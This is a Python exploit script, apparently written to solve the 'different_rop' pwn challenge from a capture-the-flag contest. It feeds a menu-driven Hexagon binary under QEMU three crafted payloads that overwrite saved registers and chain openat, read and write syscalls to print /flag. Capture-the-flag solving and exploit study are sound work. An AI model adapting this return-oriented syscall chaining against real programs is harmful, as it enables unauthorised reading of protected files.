#!/usr/bin/env python3
"""
Exploit v2: send all input upfront, collect all output.
"""
import struct, subprocess, os, time

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
FLAG_ADDR = 0x4080e4e0
TRAP0 = 0x2ba08
RESTART = 0x21168

def build_note(sysno, r0, r1, r2, r3=0, r4=0, r5=0, has_flag=False):
    note = bytearray(64)
    struct.pack_into('<I', note, 4,  r5)
    struct.pack_into('<I', note, 8,  r4)
    struct.pack_into('<I', note, 12, r3)
    struct.pack_into('<I', note, 16, r2)
    struct.pack_into('<I', note, 20, r1)
    struct.pack_into('<I', note, 24, r0)
    struct.pack_into('<I', note, 28, sysno)
    if has_flag:
        note[32:38] = b'/flag\x00'
    struct.pack_into('<I', note, 48, 0x4080e4f8)
    struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, 0x4080e4f0)
    struct.pack_into('<I', note, 60, RESTART)
    return note

note1 = build_note(SYS_OPENAT, AT_FDCWD, FLAG_ADDR, 0, has_flag=True)
note2 = build_note(SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note(SYS_WRITE, 1, BSS_BUF, 0x100)

# Build complete input stream
# Menu: select 3 (calibrate), send note, wait for restart
# After restart, select 3 again, send note, restart again
# After second restart, select 3, send note, then exit
input_data = (
    b'3\n' + bytes(note1) + b'\n' +   # Stage 1: openat
    b'3\n' + bytes(note2) + b'\n' +   # Stage 2: read
    b'3\n' + bytes(note3) + b'\n' +   # Stage 3: write
    b'5\n'                             # Exit
)

print("[*] Running exploit with all input upfront...")
print(f"[*] Input size: {len(input_data)} bytes")

p = subprocess.run(
    ['./qemu-hexagon', '-strace', './pwn'],
    input=input_data,
    capture_output=True,
    timeout=30
)

stdout = p.stdout.decode(errors='replace')
stderr = p.stderr.decode(errors='replace')

print(f"[*] STDOUT size: {len(stdout)} bytes")
print(f"[*] STDERR size: {len(stderr)} bytes")

# Look for flag in stdout
print("\n=== STDOUT ===")
print(stdout[:3000])
if len(stdout) > 3000:
    print(f"\n... ({len(stdout) - 3000} more bytes) ...")
    # Show the last part which might contain the flag
    print("\n=== LAST 1000 BYTES OF STDOUT ===")
    print(stdout[-1000:])

print("\n=== STDERR (syscalls) ===")
for line in stderr.split('\n'):
    stripped = line.strip()
    if any(kw in stripped for kw in ['openat', 'read(', 'write(', 'SIG', 'exit', 'flag']):
        print(stripped)

# Check for flag pattern
if 'flag' in stdout.lower() or 'ctf' in stdout.lower() or '{' in stdout:
    print("\n*** POSSIBLE FLAG FOUND IN OUTPUT ***")
    for line in stdout.split('\n'):
        if 'flag' in line.lower() or 'ctf' in line.lower() or '{' in line:
            print(f"  >>> {line.strip()}")
